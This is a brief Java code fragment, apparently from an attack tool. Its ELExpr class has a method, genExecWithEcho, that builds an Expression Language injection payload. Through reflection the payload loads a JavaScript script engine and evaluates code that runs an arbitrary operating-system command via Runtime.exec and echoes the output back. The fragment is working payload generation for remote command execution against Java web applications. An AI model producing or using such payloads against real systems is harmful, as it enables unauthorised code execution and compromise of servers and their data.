...
public class ELExpr implements IExpr {
    ...
    public String[] genExecWithEcho(String command) {
        return new String[]{
                out("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();')")
        };
    }
